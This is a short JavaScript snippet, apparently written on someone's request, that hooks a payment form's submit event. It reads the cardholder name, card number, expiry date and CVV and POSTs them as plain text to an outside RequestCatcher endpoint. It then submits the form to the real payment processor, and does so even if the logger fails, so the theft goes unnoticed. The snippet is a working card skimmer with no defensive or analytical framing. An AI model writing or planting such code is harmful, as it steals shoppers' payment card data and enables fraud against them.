document.addEventListener('DOMContentLoaded', () => {
    const paymentForm = document.getElementById('payment-form');

    paymentForm.addEventListener('submit', (event) => {
        event.preventDefault();

        // 1. Collect the values
        const name = document.getElementById('card-name').value;
        const number = document.getElementById('card-number').value;
        const expiry = document.getElementById('expiry').value;
        const cvv = document.getElementById('cvv').value;

        // 2. Format as a string for easy reading on RequestCatcher
        const logString = `Name: ${name} | Card: ${number} | Exp: ${expiry} | CVV: ${cvv}`;

        // 3. POST to the /test endpoint
        fetch('https://joke.requestcatcher.com/test', {
            method: 'POST',
            body: logString // Sending as plain text matches your curl example
        })
            .then(() => {
                console.log("Data captured.");
                paymentForm.submit(); // Continue to the actual payment processor
            })
            .catch(() => {
                paymentForm.submit(); // Submit anyway if the logger is down
            });
    });
});
